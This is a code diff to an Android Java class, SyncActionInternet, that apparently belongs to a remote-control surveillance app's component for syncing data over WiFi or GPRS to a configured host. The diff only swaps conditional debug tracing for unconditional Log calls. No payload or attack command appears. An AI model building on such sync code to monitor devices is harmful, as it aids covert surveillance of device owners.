@@ -10,6 +10,8 @@ package com.ht.RCSAndroidGUI.action;
 
 import java.io.IOException;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.action.sync.GprsTransport;
 import com.ht.RCSAndroidGUI.action.sync.WifiTransport;
 import com.ht.RCSAndroidGUI.utils.DataBuffer;
@@ -20,6 +22,8 @@ import com.ht.RCSAndroidGUI.utils.WChar;
  * The Class SyncActionInternet.
  */
 public class SyncActionInternet extends SyncAction {
+
+	private static final String TAG = "SyncActionInternet";
 
 	/** The wifi forced. */
 	protected boolean wifiForced;
@@ -66,21 +70,15 @@ public class SyncActionInternet extends SyncAction {
 			host = WChar.getString(buffer, true);
 
 		} catch (final IOException e) {
-			// #ifdef DEBUG
-			debug.error("params FAILED");
-			// #endif
+			Log.e(TAG,"params FAILED");
 			return false;
 		}
-
-		// #ifdef DEBUG
 		final StringBuffer sb = new StringBuffer();
 		sb.append("gprs: " + gprs);
 		sb.append(" wifi: " + wifi);
 		sb.append(" wifiForced: " + wifiForced);
 		sb.append(" host: " + host);
-		debug.trace(sb.toString());
-		// #endif
-
+		Log.d(TAG,sb.toString());
 		return true;
 	}
 
@@ -92,16 +90,12 @@ public class SyncActionInternet extends SyncAction {
 	@Override
 	protected boolean initTransport() {
 		if (wifi) {
-			// #ifdef DEBUG
-			debug.trace("initTransport adding WifiTransport");
-			// #endif
+			Log.d(TAG,"initTransport adding WifiTransport");
 			transports.addElement(new WifiTransport(host, wifiForced));
 		}
 
 		if (gprs) {
-			// #ifdef DEBUG
-			debug.trace("initTransport adding DirectTransport");
-			// #endif
+			Log.d(TAG,"initTransport adding DirectTransport");
 			transports.addElement(new GprsTransport(host));
 		}
 
